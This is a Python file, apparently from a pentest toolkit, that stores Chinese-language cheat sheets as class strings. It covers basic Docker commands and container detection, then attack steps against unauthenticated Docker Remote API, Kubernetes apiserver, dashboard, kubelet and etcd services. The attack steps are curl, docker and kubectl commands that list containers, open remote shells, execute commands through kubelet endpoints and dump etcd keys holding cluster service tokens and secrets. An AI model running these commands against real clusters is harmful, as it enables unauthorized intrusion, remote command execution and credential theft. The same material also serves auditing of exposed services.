# encoding: utf8

class Shell:
    def __init__(self):
        self.info = {
            'Name': 'Docker K8S',
            'Author': 'nul1',
            'Update': '2021/08/10',
        }

        self.docker_usage = """
拉取镜像 - docker pull busybox
查看镜像 - docker images
运行容器 - docker run --name test -p8888:80 -d IMAGE
查看日志 - docker logs -f ID
查看所有的容器 - docker ps -a
停止容器 - docker stop ID
启动容器 - docker start ID
删除容器 - docker rm ID
删除镜像 - docker rmi IMAGE
在运行容器中执行命令 - docker exec -it ID /bin/bash
宿主机拷贝文件到容器 - docker cp 1.zip cec76fe3f372:/app
容器拷贝文件到宿主机 - docker cp cec:/app/1.py /tmp/2
"""
        self.docker_is = """
1. 无部分命令：wget、ifconfig
2. 存在.dockerenv文件
3. cat /proc/1/cgroup        
"""

        self.docker_remote_api = """
1. 检测是否存在未授权 
curl http://host:2375/containers/json

2. 获取所有images列表
curl http://host:2375/containers/json

3. 获取运行中的容器
docker -H tcp://host:2375 ps

4. 获取镜像
docker -H tcp://host:2375 images      

5. 获取shell
docker -H tcp://host:2375 exec -it 2d6ea0f90df1 /bin/bash  
"""

        self.k8s_apiserver = """
1. 端口信息
HTTP服务：8080  - 没有认证和授权检查   HTTPS服务：6443 - 有认证 

2. 查看namespace
kubectl -s "IP:8080" get namespace

3. 查看指定namespace下的pods
kubectl -s "IP:8080" --namespace=xxx get pods

4. 获取shell
kubectl -s "ip:8080" --namespace=xxx exec -it id bash
"""
        self.k8s_dashboard = """
Dashboard是Kubernetes官方推出的控制Kubernetes的图形化界面，在Kubernetes配置不当导致dashboard未授权访问漏洞的情况下，通过dashboard我们可以控制整个集群.
        
通过路径/ui即可访问
"""

        self.k8s_kubelet = """
kubernetes 是一个分布式的集群管理系统，在每个节点（node）上都要运行一个 worker 对容器进行生命周期的管理，这个 worker 程序就是 kubelet.

10250端口是kubelet API的HTTPS端口，该端口提供了pod和node的信息，如果该端口对外开放，攻击者可以利用公开api来获取敏感信息，甚至执行命令。

1. 检测是否未授权
curl -k https://ip:10250/pods        

2. 获取shell（方法一）
curl -k -XPOST "https://ip:10250/run/{namespace}/{podname}/{containername}" -d "cmd=ls /"

3. 获取shell（方法二）
curl -Gks https://ip:10250/exec/{namespace}/{podname}/{containername} -d 'input=1' -d 'output=1' -d 'tty=1' -d 'command=whoami'
wscat -c "https://ip:10250/cri/exec/A9NSSf9i" --no-check
"""

        self.k8s_etcd = """
通常etcd数据库会被安装到master节点上，rest api可获取集群内token、证书、账户密码等敏感信息，默认端口为2379.

1. 检测是否未授权
curl http://ip:2379/v2/keys/?recursive=true

2. 查询
若存在路径/registry/secrets/default，其中可能包含对集群提升权限的默认服务令牌。
etcdctl --endpoints="http://ip:2379" ls  
"""
